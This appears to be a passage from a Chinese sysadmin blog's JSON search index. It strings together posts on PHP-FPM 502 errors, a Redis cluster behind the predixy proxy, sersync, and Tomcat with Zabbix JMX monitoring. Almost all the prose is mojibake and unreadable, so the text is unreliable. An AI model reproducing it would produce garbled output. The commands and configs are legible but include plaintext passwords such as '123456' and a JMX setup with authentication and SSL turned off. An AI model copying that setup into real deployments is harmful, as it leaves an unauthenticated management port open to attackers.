http://www.cnblogs.com/argb/p/3604340.html å¦‚æœfile_get_contentsè¯·æ±‚çš„è¿œç¨‹èµ„æºå¦‚æœååº”è¿‡æ…¢ï¼Œfile_get_contentså°±ä¼šä¸€ç›´å¡åœ¨é‚£é‡Œä¸ä¼šè¶…æ—¶ã€‚æˆ‘ä»¬çŸ¥é“php.ini é‡Œé¢max_execution_time å¯ä»¥è®¾ç½® PHP è„šæœ¬çš„æœ€å¤§æ‰§è¡Œæ—¶é—´ï¼Œä½†æ˜¯ï¼Œåœ¨ php-cgi(php-fpm) ä¸­ï¼Œè¯¥å‚æ•°ä¸ä¼šèµ·æ•ˆã€‚çœŸæ­£èƒ½å¤Ÿæ§åˆ¶ PHP è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´çš„æ˜¯ php-fpm.conf é…ç½®æ–‡ä»¶ä¸­çš„request_terminate_timeoutå‚æ•°ã€‚ request_terminate_timeouté»˜è®¤å€¼ä¸º 0 ç§’ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼ŒPHP è„šæœ¬ä¼šä¸€ç›´æ‰§è¡Œä¸‹å»ã€‚è¿™æ ·ï¼Œå½“æ‰€æœ‰çš„ php-cgi è¿›ç¨‹éƒ½å¡åœ¨ file_get_contents() å‡½æ•°æ—¶ï¼Œè¿™å° Nginx+PHP çš„ WebServer å·²ç»æ— æ³•å†å¤„ç†æ–°çš„ PHP è¯·æ±‚äº†ï¼ŒNginx å°†ç»™ç”¨æˆ·è¿”å›â€œ502 Bad Gatewayâ€ã€‚ä¿®æ”¹è¯¥å‚æ•°ï¼Œè®¾ç½®ä¸€ä¸ª PHP è„šæœ¬æœ€å¤§æ‰§è¡Œæ—¶é—´æ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯ï¼Œæ²»æ ‡ä¸æ²»æœ¬ã€‚ä¾‹å¦‚æ”¹æˆ 30sï¼Œå¦‚æœå‘ç”Ÿ file_get_contents() è·å–ç½‘é¡µå†…å®¹è¾ƒæ…¢çš„æƒ…å†µï¼Œè¿™å°±æ„å‘³ç€ 150 ä¸ª php-cgi è¿›ç¨‹ï¼Œæ¯ç§’é’Ÿåªèƒ½å¤„ç† 5 ä¸ªè¯·æ±‚ï¼ŒWebServer åŒæ ·å¾ˆéš¾é¿å…â€502 Bad Gatewayâ€ã€‚è§£å†³åŠæ³•æ˜¯request_terminate_timeoutè®¾ç½®ä¸º10sæˆ–è€…ä¸€ä¸ªåˆç†çš„å€¼ï¼Œæˆ–è€…ç»™file_get_contentsåŠ ä¸€ä¸ªè¶…æ—¶å‚æ•°ã€‚ $ctx = stream_context_create(array( 'http' =\u003e array( 'timeout' =\u003e 10 //è®¾ç½®ä¸€ä¸ªè¶…æ—¶æ—¶é—´ï¼Œå•ä½ä¸ºç§’ ) )); file_get_contents($str, 0, $ctx); 3. max_requestså‚æ•°é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•èµ·é—´æ­‡æ€§502é”™è¯¯(è½¬) pm.max_requests = 1000 è®¾ç½®æ¯ä¸ªå­è¿›ç¨‹é‡ç”Ÿä¹‹å‰æœåŠ¡çš„è¯·æ±‚æ•°. å¯¹äºå¯èƒ½å­˜åœ¨å†…å­˜æ³„æ¼çš„ç¬¬ä¸‰æ–¹æ¨¡å—æ¥è¯´æ˜¯éå¸¸æœ‰ç”¨çš„. å¦‚æœè®¾ç½®ä¸º â€™0â€² åˆ™ä¸€ç›´æ¥å—è¯·æ±‚. ç­‰åŒäº PHP_FCGI_MAX_REQUESTS ç¯å¢ƒå˜é‡. é»˜è®¤å€¼: 0. è¿™æ®µé…ç½®çš„æ„æ€æ˜¯ï¼Œå½“ä¸€ä¸ª PHP-CGI è¿›ç¨‹å¤„ç†çš„è¯·æ±‚æ•°ç´¯ç§¯åˆ° 500 ä¸ªåï¼Œè‡ªåŠ¨é‡å¯è¯¥è¿›ç¨‹ã€‚ ä½†æ˜¯ä¸ºä»€ä¹ˆè¦é‡å¯è¿›ç¨‹å‘¢ï¼Ÿ ä¸€èˆ¬åœ¨é¡¹ç›®ä¸­ï¼Œæˆ‘ä»¬å¤šå¤šå°‘å°‘éƒ½ä¼šç”¨åˆ°ä¸€äº› PHP çš„ç¬¬ä¸‰æ–¹åº“ï¼Œè¿™äº›ç¬¬ä¸‰æ–¹åº“ç»å¸¸å­˜åœ¨å†…å­˜æ³„æ¼é—®é¢˜ï¼Œå¦‚æœä¸å®šæœŸé‡å¯ PHP-CGI è¿›ç¨‹ï¼ŒåŠ¿å¿…é€ æˆå†…å­˜ä½¿ç”¨é‡ä¸æ–­å¢é•¿ã€‚å› æ­¤ PHP-FPM ä½œä¸º PHP-CGI çš„ç®¡ç†å™¨ï¼Œæä¾›äº†è¿™ä¹ˆä¸€é¡¹ç›‘æ§åŠŸèƒ½ï¼Œå¯¹è¯·æ±‚è¾¾åˆ°æŒ‡å®šæ¬¡æ•°çš„ PHP-CGI è¿›ç¨‹è¿›è¡Œé‡å¯ï¼Œä¿è¯å†…å­˜ä½¿ç”¨é‡ä¸å¢é•¿ã€‚ æ­£æ˜¯å› ä¸ºè¿™ä¸ªæœºåˆ¶ï¼Œåœ¨é«˜å¹¶å‘çš„ç«™ç‚¹ä¸­ï¼Œç»å¸¸å¯¼è‡´ 502 é”™è¯¯ï¼Œæˆ‘çŒœæµ‹åŸå› æ˜¯ PHP-FPM å¯¹ä» NGINX è¿‡æ¥çš„è¯·æ±‚é˜Ÿåˆ—æ²¡å¤„ç†å¥½ã€‚ä¸è¿‡æˆ‘ç›®å‰ç”¨çš„è¿˜æ˜¯ PHP 5.3.2ï¼Œä¸çŸ¥é“åœ¨ PHP 5.3.3 ä¸­æ˜¯å¦è¿˜å­˜åœ¨è¿™ä¸ªé—®é¢˜ã€‚ ç›®å‰æˆ‘ä»¬çš„è§£å†³æ–¹æ³•æ˜¯ï¼ŒæŠŠè¿™ä¸ªå€¼å°½é‡è®¾ç½®å¤§äº›ï¼Œå°½å¯èƒ½å‡å°‘ PHP-CGI é‡æ–° SPAWN çš„æ¬¡æ•°ï¼ŒåŒæ—¶ä¹Ÿèƒ½æé«˜æ€»ä½“æ€§èƒ½ã€‚åœ¨æˆ‘ä»¬è‡ªå·±å®é™…çš„ç”Ÿäº§ç¯å¢ƒä¸­å‘ç°ï¼Œå†…å­˜æ³„æ¼å¹¶ä¸æ˜æ˜¾ï¼Œå› æ­¤æˆ‘ä»¬å°†è¿™ä¸ªå€¼è®¾ç½®å¾—éå¸¸å¤§ï¼ˆ204800ï¼‰ã€‚å¤§å®¶è¦æ ¹æ®è‡ªå·±çš„å®é™…æƒ…å†µè®¾ç½®è¿™ä¸ªå€¼ï¼Œä¸èƒ½ç›²ç›®åœ°åŠ å¤§ã€‚ è¯è¯´å›æ¥ï¼Œè¿™å¥—æœºåˆ¶ç›®çš„åªä¸ºä¿è¯ PHP-CGI ä¸è¿‡åˆ†åœ°å ç”¨å†…å­˜ï¼Œä¸ºä½•ä¸é€šè¿‡æ£€æµ‹å†…å­˜çš„æ–¹å¼æ¥å¤„ç†å‘¢ï¼Ÿæˆ‘éå¸¸è®¤åŒé«˜æ˜¥è¾‰æ‰€è¯´çš„ï¼Œé€šè¿‡è®¾ç½®è¿›ç¨‹çš„å³°å€¼å†…åœ¨å ç”¨é‡æ¥é‡å¯ PHP-CGI è¿›ç¨‹ï¼Œä¼šæ˜¯æ›´å¥½çš„ä¸€ä¸ªè§£å†³æ–¹æ¡ˆã€‚ 4. php-fpmçš„æ…¢æ—¥å¿—ï¼ŒdebugåŠå¼‚å¸¸æ’æŸ¥ç¥å™¨ï¼š request_slowlog_timeoutè®¾ç½®ä¸€ä¸ªè¶…æ—¶çš„å‚æ•°ï¼Œslowlogè®¾ç½®æ…¢æ—¥å¿—çš„å­˜æ”¾ä½ç½® tail -f /var/log/www.slow.log ä¸Šé¢çš„å‘½ä»¤å³å¯çœ‹åˆ°æ‰§è¡Œè¿‡æ…¢çš„phpè¿‡ç¨‹ã€‚ å¤§å®¶å¯ä»¥çœ‹åˆ°ç»å¸¸å‡ºç°çš„ç½‘ç»œè¯»å–è¶…è¿‡ã€MysqlæŸ¥è¯¢è¿‡æ…¢çš„é—®é¢˜ï¼Œæ ¹æ®æç¤ºä¿¡æ¯å†æ’æŸ¥é—®é¢˜å°±æœ‰å¾ˆæ˜ç¡®çš„æ–¹å‘äº†ã€‚ ","date":"2022-06-22","objectID":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","php","è§£å†³æ–¹æ¡ˆ"],"title":"Phpè¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/php%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Redisé›†ç¾¤åŠredisä»£ç†predixyé…ç½®","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/","tags":["linux","redis","è§£å†³æ–¹æ¡ˆ"],"title":"Redisé›†ç¾¤åŠredisä»£ç†é…ç½®","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. æµ‹è¯•ç‰ˆæœ¬: redis 5.0.9 make PREFIX=/opt/redis-5.0.10 install mkdir -p /opt/redis-5.0.10/{data,logs,etc} 1.1. é…ç½®æ–‡ä»¶é¢å¤–ä¿®æ”¹ä»¥ä¸‹å‚æ•°(å¤šå°‘ä¸ªèŠ‚ç‚¹ï¼Œå¤šå°‘ä¸ªç‹¬ç«‹é…ç½®æ–‡ä»¶) masterauth 123456 # ä¸requirepasså¯†ç ä¸€è‡´ cluster-enabled yes cluster-config-file /data/cacheDB/redis-server/etc/nodes-6370.conf cluster-node-timeout 15000 1.2. å¯åŠ¨ /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6370.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6371.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6372.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6375.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6376.conf /data/cacheDB/redis-server/bin/redis-server /data/cacheDB/redis-server/etc/redis_6377.conf 1.3. æ¿€æ´»é›†ç¾¤è¿æ¥ /data/cacheDB/redis-server/bin/redis-cli \\ --cluster create \\ 192.16.10.200:6371 \\ 192.16.10.200:6372 \\ 192.16.10.200:6373 \\ 192.16.10.201:6375 \\ 192.16.10.201:6376 \\ 192.16.10.201:6377 \\ --cluster-replicas 1 \\ -a 123456 # -cluster-replicas 1 ä»èŠ‚ç‚¹ä¸ªæ•°ï¼Œä»¥ä¸Šä¸º3ä¸»3ä» 1.4. redis ä»£ç†(ä¸€ä¸ªæœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œçœ‹éœ€è¦éƒ¨ç½²å¤šèŠ‚ç‚¹) https://juejin.im/post/6863701563685371917 yum install libstdc++-static gcc gcc-c++ -y git clone https://github.com/joyieldInc/predixy.git make MT=true cp -v ./conf/auth.conf /opt/redis-server/conf/auth.conf cp -v ./conf/cluster.conf /opt/redis-server/conf/cluster.conf cp -v ./conf/latency.conf /opt/redis-server/conf/latency.conf cp -v ./conf/predixy.conf /opt/redis-server/conf/predixy.conf cp -v ./src/predixy /opt/redis-server/bin/ ## /opt/redis-server/conf/predixy.conf # ä¿®æ”¹æŒ‡ç¤ºèŠ‚ç‚¹å Name Predixy_192.16.10.200 # å¯ä»¥ä¿®æ”¹ç«¯å£ Bind 192.16.10.200:6370 # ä¿®æ”¹å†…å®¹ Include try.conf # ä¸º Include cluster.conf ## /opt/redis-server/conf/auth.conf # ç§»é™¤æ‰€æœ‰å¯å†™æƒé™ # è®¾ç½®ç®¡ç†æƒé™å¯†ç ä¸ºredisä¸€è‡´ # ## /opt/redis-server/conf/cluster.conf # ä¿®æ”¹æˆ–æ·»åŠ å†…å®¹ä¸º ClusterServerPool { Password i4ZHIJNDYvndeZOh MasterReadPriority 60 StaticSlaveReadPriority 50 DynamicSlaveReadPriority 50 RefreshInterval 1 ServerTimeout 1 ServerFailureLimit 10 ServerRetryTimeout 1 KeepAlive 120 Servers { + 192.16.10.200:6371 + 192.16.10.200:6372 + 192.16.10.200:6373 + 192.16.10.201:6375 + 192.16.10.201:6376 + 192.16.10.201:6377 } } # å¯åŠ¨ /opt/redis-server/bin/predixy /opt/redis-server/conf/predixy.conf # è¿æ¥ /opt/redis-server/bin/redis-cli -h 172.16.80.31 -p 6370 ","date":"2022-06-22","objectID":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/:0:0","tags":["linux","redis","è§£å†³æ–¹æ¡ˆ"],"title":"Redisé›†ç¾¤åŠredisä»£ç†é…ç½®","uri":"/posts/linux/redis%E9%9B%86%E7%BE%A4%E5%8F%8Aredis%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Sersyncå®æ—¶åŒæ­¥å·¥å…·","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/","tags":["linux","åŒæ­¥","rsync"],"title":"Sersyncå®æ—¶åŒæ­¥å·¥å…·","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":" ç®€ä»‹ ä¸€ä¸ªå¯ä»¥å®æ—¶åŒæ­¥çš„å·¥å…·ï¼Œä½†ä¸èƒ½å•ç‹¬è¿è¡Œï¼Œéœ€è¦é…åˆrsyncä½¿ç”¨ï¼Œç›¸å½“äºinotify+rsync,ä½†æ˜¯æ¯”ä»–ä»¬æ•ˆç‡æ›´é«˜ï¼ŒåŸºäºå—å¤åˆ¶ã€‚ 1.1. ç¨‹åºè¯´æ˜ # æ–‡ä»¶ä¸‹è½½è§£å‹åå®é™…ä¸Šå°±åªæœ‰ä¸¤ä¸ªæ–‡ä»¶ . â””â”€â”€ GNU-Linux-x86 â”œâ”€â”€ confxml.xml â””â”€â”€ sersync2 1.2. ä¸‹è½½ # ä»£ç æ›´æ–°åœ°å€ https://code.google.com/archive/p/sersync/downloads # ä¸‹è½½ wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/sersync/sersync2.5.4_64bit_binary_stable_final.tar.gz 1.3. è§„åˆ’ç›®å½• mkdir -p /opt/sersync/{bin,logs,etc} cp ./GNU-Linux-x86/confxml.xml /opt/sersync/etc cp ./GNU-Linux-x86/sersync2 /opt/sersync/bin 1.4. å‚æ•°è¯´æ˜ 1.4.1. ä¸»ç¨‹åº [root@11 bin]# /opt/sersync/bin/sersync2 -h # ä¸­æ–‡å¸®åŠ©æ–‡æ¡£ï¼Œå¾ˆæ¸…æ™° set the system param executeï¼šecho 50000000 \u003e /proc/sys/fs/inotify/max_user_watches executeï¼šecho 327679 \u003e /proc/sys/fs/inotify/max_queued_events parse the command param _______________________________________________________ å‚æ•°-d:å¯ç”¨å®ˆæŠ¤è¿›ç¨‹æ¨¡å¼ å‚æ•°-r:åœ¨ç›‘æ§å‰ï¼Œå°†ç›‘æ§ç›®å½•ä¸è¿œç¨‹ä¸»æœºç”¨rsyncå‘½ä»¤æ¨é€ä¸€é cå‚æ•°-n: æŒ‡å®šå¼€å¯å®ˆæŠ¤çº¿ç¨‹çš„æ•°é‡ï¼Œé»˜è®¤ä¸º10ä¸ª å‚æ•°-o:æŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œé»˜è®¤ä½¿ç”¨confxml.xmlæ–‡ä»¶ å‚æ•°-m:å•ç‹¬å¯ç”¨å…¶ä»–æ¨¡å—ï¼Œä½¿ç”¨ -m refreshCDN å¼€å¯åˆ·æ–°CDNæ¨¡å— å‚æ•°-m:å•ç‹¬å¯ç”¨å…¶ä»–æ¨¡å—ï¼Œä½¿ç”¨ -m socket å¼€å¯socketæ¨¡å— å‚æ•°-m:å•ç‹¬å¯ç”¨å…¶ä»–æ¨¡å—ï¼Œä½¿ç”¨ -m http å¼€å¯httpæ¨¡å— ä¸åŠ -må‚æ•°ï¼Œåˆ™é»˜è®¤æ‰§è¡ŒåŒæ­¥ç¨‹åº ________________________________________________________________ 1.4.2. é…ç½®æ–‡ä»¶ \u003c!-- å°±æ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ --\u003e \u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e \u003chead version=\"2.5\"\u003e \u003chost hostip=\"localhost\" port=\"8008\"\u003e\u003c/host\u003e \u003cdebug start=\"false\"/\u003e \u003cfileSystem xfs=\"false\"/\u003e \u003c!-- xfs æ–‡ä»¶ç³»ç»Ÿå»ºè®®å¼€å¯ --\u003e \u003cfilter start=\"false\"\u003e \u003c!-- start=\"true\" å¼€å¯æ’é™¤æ–‡ä»¶,é»˜è®¤å…³é—­,ä¸è¿‡å¼€å¯æ—¶ç¬¬ä¸€æ¬¡ä¸èƒ½è¿›è¡Œåˆå§‹åŒæ­¥ï¼Œå¯èƒ½æ˜¯bugï¼Œä¹Ÿå¯èƒ½æœ¬èº«æ˜¯è¿™ä¹ˆè®¾å®šçš„ --\u003e \u003cexclude expression=\"(.*)\\.svn\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"(.*)\\.gz\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"^info/*\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"^static/*\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"(.*)/core\\.[0-9]+$\"\u003e\u003c/exclude\u003e \u003c/filter\u003e \u003cinotify\u003e \u003cdelete start=\"true\"/\u003e \u003ccreateFolder start=\"true\"/\u003e \u003ccreateFile start=\"true\"/\u003e \u003ccloseWrite start=\"true\"/\u003e \u003cmoveFrom start=\"true\"/\u003e \u003cmoveTo start=\"true\"/\u003e \u003cattrib start=\"false\"/\u003e \u003cmodify start=\"false\"/\u003e \u003c/inotify\u003e \u003csersync\u003e\u003c!-- å®é™…ä¸Šå°±æ˜¯rsyncçš„å‘½ä»¤åŠç›¸å…³å‚æ•° --\u003e \u003clocalpath watch=\"/data/www\"\u003e \u003c!-- åŒæ­¥çš„æº,æœ¬åœ°åŒæ­¥è·¯å¾„ --\u003e \u003cremote ip=\"172.16.10.11\" name=\"demo\"/\u003e \u003c!-- ip:rsync æœåŠ¡çš„ip name:åŒæ­¥çš„æ¨¡å—(å¯è·Ÿä¸Šç›®å½•) --\u003e \u003c!--\u003cremote ip=\"192.168.8.39\" name=\"tongbu\"/\u003e--\u003e \u003c!--\u003cremote ip=\"192.168.8.40\" name=\"tongbu\"/\u003e--\u003e \u003c/localpath\u003e \u003crsync\u003e \u003ccommonParams params=\"-avz\"/\u003e \u003cauth start=\"true\" users=\"rsync_backup\" passwordfile=\"/etc/rsync.pas\"/\u003e \u003cuserDefinedPort start=\"false\" port=\"874\"/\u003e\u003c!-- port=874 --\u003e \u003ctimeout start=\"false\" time=\"100\"/\u003e\u003c!-- timeout=100 --\u003e \u003cssh start=\"false\"/\u003e \u003c/rsync\u003e \u003cfailLog path=\"/opt/sersync/logs/rsync_fail_log.sh\" timeToExecute=\"60\"/\u003e\u003c!--default every 60mins execute once--\u003e \u003ccrontab start=\"false\" schedule=\"600\"\u003e\u003c!--600mins--\u003e \u003ccrontabfilter start=\"false\"\u003e \u003cexclude expression=\"*.php\"\u003e\u003c/exclude\u003e \u003cexclude expression=\"info/*\"\u003e\u003c/exclude\u003e \u003c/crontabfilter\u003e \u003c/crontab\u003e \u003cplugin start=\"false\" name=\"command\"/\u003e \u003c/sersync\u003e \u003cplugin name=\"command\"\u003e \u003cparam prefix=\"/bin/sh\" suffix=\"\" ignoreError=\"true\"/\u003e \u003c!--prefix /opt/tongbu/mmm.sh suffix--\u003e \u003cfilter start=\"false\"\u003e \u003cinclude expression=\"(.*)\\.php\"/\u003e \u003cinclude expression=\"(.*)\\.sh\"/\u003e \u003c/filter\u003e \u003c/plugin\u003e \u003cplugin name=\"socket\"\u003e \u003clocalpath watch=\"/opt/tongbu\"\u003e \u003cdeshost ip=\"192.168.138.20\" port=\"8009\"/\u003e \u003c/localpath\u003e \u003c/plugin\u003e \u003cplugin name=\"refreshCDN\"\u003e \u003clocalpath watch=\"/data0/htdocs/cms.xoyo.com/site/\"\u003e \u003ccdninfo domainname=\"ccms.chinacache.com\" port=\"80\" username=\"xxxx\" passwd=\"xxxx\"/\u003e \u003csendurl base=\"http://pic.xoyo.com/cms\"/\u003e \u003cregexurl regex=\"false\" match=\"cms.xoyo.com/site([/a-zA-Z0-9]*).xoyo.com/images\"/\u003e \u003c/localpath\u003e \u003c/plugin\u003e \u003c/head\u003e ","date":"2022-06-22","objectID":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/:0:0","tags":["linux","åŒæ­¥","rsync"],"title":"Sersyncå®æ—¶åŒæ­¥å·¥å…·","uri":"/posts/linux/sersync%E5%AE%9E%E6%97%B6%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"Tcp.ipåè®®æ¦‚è¿°","date":"2022-06-22","objectID":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/","tags":["linux","tcp"],"title":"TCP/IP åè®®æ¦‚è¿°","uri":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" å¼•ç”¨ ä¸¤å¼ åŠ¨å›¾-å½»åº•æ˜ç™½TCPçš„ä¸‰æ¬¡æ¡æ‰‹ä¸å››æ¬¡æŒ¥æ‰‹ ","date":"2022-06-22","objectID":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/:0:0","tags":["linux","tcp"],"title":"TCP/IP åè®®æ¦‚è¿°","uri":"/posts/linux/tcp.ip%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Tomcatå®‰è£…åŠä¼˜åŒ–","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/","tags":["linux","ä¼˜åŒ–","tomcat"],"title":"Tomcatå®‰è£…åŠä¼˜åŒ–","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"/etc/profile java export JAVA_HOME=/opt/jdk1.8.0_271 export PATH=$JAVA_HOME/bin:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar tomcat export TOMCAT_HOME=/opt/tomcat-8.5.59 æ—¥å¿— catalina.out ä¸ºä¸»è¦æ—¥å¿—æ–‡ä»¶ï¼Œä¼šéšç€æ—¶é—´ä¸æ–­å¢åŠ  catalina.$(date +\"%Y-%m-%d\").log ä¸ºcatalina.outçš„æ¯æ—¥åˆ‡å‰²æ–‡ä»¶(å®é™…å¥½åƒä¸æ˜¯ï¼Œtomcatä¸ä¼šè‡ªåŠ¨åˆ‡å‰²æ—¥å¿—) å¤šå®ä¾‹ å¤šå®ä¾‹å°±æ˜¯å¤šä¸ªtomcatï¼Œç„¶åä¿®æ”¹ä¸‹ç«¯å£å°±è¡Œäº† ç›‘æ§ å‘½ä»¤ç›‘æ§ jps -lvm show-busy-java-threads æŸ¥è¯¢åˆ°ç¹å¿™çš„javaè¿›ç¨‹pidå,é€šè¿‡jstack \u003cpid\u003eæŸ¥è¯¢è¯¦ç»†ä¿¡æ¯ï¼Œç„¶åå‘é€ç»™å¼€å‘äººå‘˜å³å¯ zabbix ç›‘æ§ ç³»ç»Ÿå°½é‡ä¸è¦ä½¿ç”¨çº¯æ•°å­—ä½œä¸ºä¸»æœºå tomcat å¼€å¯è¿œç¨‹ç›‘æ§åŠŸèƒ½ $\u003e vim +124 /opt/tomcat-8.5.59/bin/catalina.sh # 124 CATALINA_OPTS=\"$CATALINA_OPTS -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port=12345 -Dcom.sun.management.jmxremote.authenticate=false -Dcom.sun.management.jmxremote.ssl=false -Djava.rmi.server.hostsname=10.0.2.20 # tomcatæœåŠ¡å™¨çš„ip \" zabbix_server å¯åŠ¨å¹¶é…ç½® JavaGateway $\u003e vim /opt/zabbix-server/etc/zabbix_server.conf # 282 JavaGateway=10.0.2.11 JavaGatewayPort=10052 StartJavaPollers=5 $\u003e systemctl restart zabbix_server.service $\u003e /opt/zabbix-server/sbin/zabbix_java/startup.sh # å‰ç«¯æ·»åŠ jmx ç›‘æ§, å®Œæˆ ä¼˜åŒ– æ ¹æ®æ–‡çŒ®è®°è½½ï¼Œä¸€ä¸ªtomcatä¸€èˆ¬åªéƒ¨ç½²ä¸€ä¸ªç«™ç‚¹, æ¸…ç†webbappsä¸‹æ‰€æœ‰ç›®å½•ï¼Œæ–°å»ºROOTå°†é¡¹ç›®å†…å®¹ç›´æ¥æ”¾åˆ°é‡Œé¢å»ï¼Œç„¶ånginxåä»£å³å¯ # éœ€è¦æŒ‡å®šHost ç­‰ç»‘å®šå‚æ•°ï¼Œä¸ç„¶æœ‰å‘ location / { proxy_pass http://jpress_server; proxy_set_header Host $host:$server_port; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } å…·ä½“ä¼˜åŒ–è§ å¸¸ç”¨webç¯å¢ƒä¼˜åŒ– ","date":"2022-06-22","objectID":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/:0:0","tags":["linux","ä¼˜åŒ–","tomcat"],"title":"Tomcatå®‰è£…åŠä¼˜åŒ–","uri":"/posts/linux/tomcat%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":"è®¿é—®ä¸€ä¸ªç½‘é¡µçš„å…¨è¿‡ç¨‹","date":"2022-06-22","objectID":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/","tags":["linux"],"title":"è®¿é—®ä¸€ä¸ªç½‘é¡µçš„å…¨è¿‡ç¨‹","uri":"/posts/linux/%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E7%BD%91%E9%A1%B5%E7%9A%84%E5%85%A8%E8%BF%87%E7%A8%8B/"},{"categories":["linux","æ•´ç†æ”¶é›†"],"content":" å¼•è¨€ æ€è€ƒï¼šè¯·å°½å¯èƒ½è¯¦ç»†çš„å†™å‡ºä»æµè§ˆå™¨åœ°å€æ è¾“å…¥https://www.taobao.comä¹‹ååˆ°è¿”å›é¦–é¡µå†…å®¹çš„æ•´ä¸ªè¿‡ç¨‹ä¸­çš„äº¤äº’ç»†èŠ‚ã€‚ è¿™æ˜¯æˆ‘åˆšå¼€å§‹å·¥ä½œçš„æ—¶å€™ï¼Œleaderç»™çš„æ€è€ƒé¢˜ï¼Œå½“æ—¶ä¹Ÿæ˜¯èŠ±äº†å¥½å¤šåŠŸå¤«æ‰æ€»ç»“å‡ºæ¥çš„ï¼Œæ‰€ä»¥æƒ³è®°å½•ä¸€ä¸‹ã€‚è¿™ä¸ªé¢˜ç›®æˆ‘åœ¨æ ¡æ‹›çš„æ—¶å€™ä¹Ÿè¢«é—®è¿‡ï¼Œç®—æ˜¯å¾ˆé‡è¦çš„çŸ¥è¯†ç‚¹ äº†ã€‚ 1. ç”¨æˆ·ä»æµè§ˆå™¨æ‰“å¼€ç½‘é¡µçš„è¿‡ç¨‹ DNSè§£æ å½“å°†ç½‘é¡µè¾“å…¥åˆ°æµè§ˆå™¨ä¼šè½¦åï¼Œæµè§ˆå™¨ä¼šé¦–å…ˆæŸ¥è¯¢æœ¬åœ°ç¼“å­˜å’Œhostsæ–‡ä»¶ï¼Œå¦‚æœé‡Œé¢éƒ½æ²¡æœ‰è¿™ä¸ªåŸŸåçš„è¯ï¼Œå°†ä¼šé€šè¿‡ç½‘å¡é…ç½®çš„dnsæœåŠ¡å™¨(localdns)è¿›è¡ŒæŸ¥æ‰¾,å¦‚æœlocaldnsé‡Œé¢ä¹ŸæŸ¥è¯¢ä¸åˆ°è¿™ä¸ªåŸŸåæœåŠ¡å™¨ï¼Œlocaldnså°†ä¼šæŠŠè¿™ä¸ªè¯·æ±‚å‘é€åˆ°å…¨çƒ13å°DNSæ ¹æœåŠ¡å™¨(æ ¹æœåŠ¡å™¨åªç®¡ç†é¡¶çº§åŸŸåï¼Œåˆç§°ä¸ºä¸€çº§åŸŸå)è¿›è¡ŒæŸ¥è¯¢ TCPä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ 